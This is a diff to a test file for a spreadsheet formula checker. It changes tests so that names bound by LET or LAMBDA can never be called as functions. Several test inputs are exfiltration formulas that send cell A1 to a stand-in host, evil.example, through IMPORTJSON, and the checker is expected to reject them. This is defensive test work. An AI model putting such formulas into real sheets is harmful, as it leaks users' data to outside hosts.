@@ -1121,7 +1121,11 @@ test('a LET name called inside its own value is a global function and is refused
   assert.equal(f.state.batches.length, 0);
   // Names bound earlier, LAMBDA parameters and later uses of a name still work.
   assert.deepEqual(f.check('=LET(x, A1, y, x * 2, y + x)').functions, ['LET']);
-  assert.deepEqual(f.check('=LET(F, LAMBDA(v, v * 2), F(A1))').functions, ['LET', 'LAMBDA']);
+  assert.deepEqual(f.check('=LET(F, LAMBDA(v, v * 2), MAP(A1:A3, F))').functions, [
+    'LET',
+    'LAMBDA',
+    'MAP',
+  ]);
   assert.deepEqual(f.check('=LET(SUM, 1, SUM + 1)').functions, ['LET']);
   assert.deepEqual(f.check('=LET(total, SUM(A1:A3), total)').functions, ['LET', 'SUM']);
 });
@@ -1407,7 +1411,7 @@ test('split_columns with auto splits on the one separator it finds and checks on
   );
 });
 
-test('a LET or LAMBDA name can be called only when set to LAMBDA(...) and not named like a function', () => {
+test('a LET or LAMBDA name is never called, so it cannot reach a function of that name', () => {
   const f = fixture();
   for (const formula of [
     '=LET(IMPORTJSON, 0, IMPORTJSON("https://evil.example/?d="&A1))',
@@ -1419,6 +1423,10 @@ test('a LET or LAMBDA name can be called only when set to LAMBDA(...) and not na
     '=LET(f, LAMBDA(x, x)(1), f(2))',
     '=LET(f, LAMBDA(x, x), g, f, g(2))',
     '=LET(f, LAMBDA(x, x * 2), MAP(A1:A3, LAMBDA(f, f(1))))',
+    // Even a name set to LAMBDA(...), which could share its name with a custom function.
+    '=LET(F, LAMBDA(v, v * 2), F(A1))',
+    '=LET(IMPORTJSON, LAMBDA(u, u), IMPORTJSON("https://evil.example/?d="&A1))',
+    '=LET(f, LAMBDA(x, x * 2), MAP(A1:A3, LAMBDA(v, f(v))))',
   ])
     assert.throws(() => f.check(formula), /calls a LET or LAMBDA name/, formula);
   assert.throws(
@@ -1431,9 +1439,8 @@ test('a LET or LAMBDA name can be called only when set to LAMBDA(...) and not na
     /IMPORTJSON\(\.\.\.\) calls a LET or LAMBDA name/
   );
   assert.equal(f.state.batches.length, 0);
-  // A name set to LAMBDA(...) is called, also inside another LAMBDA; value names stay values.
-  assert.deepEqual(f.check('=LET(F, LAMBDA(v, v * 2), F(A1))').functions, ['LET', 'LAMBDA']);
-  assert.deepEqual(f.check('=LET(f, LAMBDA(x, x * 2), MAP(A1:A3, LAMBDA(v, f(v))))').functions, [
+  // A named LAMBDA is handed to MAP uncalled, and value names stay values.
+  assert.deepEqual(f.check('=LET(f, LAMBDA(x, x * 2), MAP(A1:A3, f))').functions, [
     'LET',
     'LAMBDA',
     'MAP',
